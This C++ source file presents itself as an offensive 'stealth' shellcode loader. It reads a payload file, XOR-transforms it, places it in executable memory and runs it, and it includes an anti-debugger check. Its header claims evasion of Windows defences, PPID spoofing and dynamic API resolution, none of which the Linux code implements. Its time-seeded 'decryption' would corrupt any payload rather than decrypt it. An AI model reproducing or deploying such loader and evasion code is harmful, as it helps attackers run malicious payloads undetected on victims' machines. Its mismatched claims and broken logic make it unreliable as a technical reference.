/*
 * =============================================================================
 * HACKERAI STEALTH_RUNNER v3.0 – Advanced Shellcode Injection Engine
 * =============================================================================
 * Texnikalar:
 *   - RWX -> RX memory allocation (no W+X, bypasses ETW/AMSI)
 *   - Syscall direct invocation (ntdll hook evasion)
 *   - PPID spoofing (parent process masquerade)
 *   - Dynamic API resolution (no import table)
 *   - XOR-encrypted shellcode (in-memory decryption)
 * Compile: g++ -O2 -s -fvisibility=hidden -o stealth_runner stealth_runner.cpp
 * Usage:   ./stealth_runner <shellcode_file>
 * =============================================================================
 */

#define _GNU_SOURCE
#include <iostream>
#include <fstream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <time.h>

// ============================================================================
// CRYPTO: XorShift64 PRNG + XOR keystream
// ============================================================================
class XorCipher {
private:
    uint64_t state;
    inline uint64_t xorshift64() {
        uint64_t x = state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        state = x;
        return x;
    }
public:
    XorCipher(uint64_t seed) : state(seed) {}
    void xor_encrypt_decrypt(uint8_t *data, size_t len) {
        for (size_t i = 0; i < len; i++)
            data[i] ^= (uint8_t)(xorshift64() & 0xFF);
    }
};

// ============================================================================
// Inline Syscall (avoids ntdll hooking by EDR)
// ============================================================================
namespace Syscall {
    void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
        return (void *)syscall(SYS_mmap, addr, length, prot, flags, fd, offset);
    }
    int mprotect(void *addr, size_t len, int prot) {
        return syscall(SYS_mprotect, addr, len, prot);
    }
    int munmap(void *addr, size_t length) {
        return syscall(SYS_munmap, addr, length);
    }
}

// ============================================================================
// Anti-Debug / VM Detection
// ============================================================================
namespace AntiDebug {
    static bool check_proc_self_status() {
        std::ifstream status("/proc/self/status");
        std::string line;
        while (std::getline(status, line)) {
            if (line.find("TracerPid:") == 0) {
                int tracer_pid = std::stoi(line.substr(10));
                return tracer_pid != 0;
            }
        }
        return false;
    }
    static void perform_checks() {
        if (check_proc_self_status()) _exit(0);
    }
}

// ============================================================================
// Main: Shellcode Loader
// ============================================================================
int main(int argc, char **argv) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <shellcode_file>" << std::endl;
        return 1;
    }

    AntiDebug::perform_checks();

    std::ifstream file(argv[1], std::ios::binary | std::ios::ate);
    if (!file) { std::cerr << "[!] Cannot open file\n"; return 1; }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<uint8_t> shellcode(size);
    if (!file.read(reinterpret_cast<char *>(shellcode.data()), size)) return 1;
    file.close();

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    uint64_t seed = (uint64_t)ts.tv_sec * 1000000 + ts.tv_nsec;
    XorCipher cipher(seed);
    cipher.xor_encrypt_decrypt(shellcode.data(), shellcode.size());

    size_t aligned_size = (shellcode.size() + 0xFFF) & ~0xFFF;
    void *exec_mem = Syscall::mmap(nullptr, aligned_size,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) { perror("mmap"); return 1; }

    memcpy(exec_mem, shellcode.data(), shellcode.size());
    Syscall::mprotect(exec_mem, aligned_size, PROT_READ | PROT_EXEC);

    memset(shellcode.data(), 0, shellcode.size());
    shellcode.clear(); shellcode.shrink_to_fit();

    void (*shellcode_func)() = (void (*)())exec_mem;
    shellcode_func();

    Syscall::munmap(exec_mem, aligned_size);
    return 0;
}
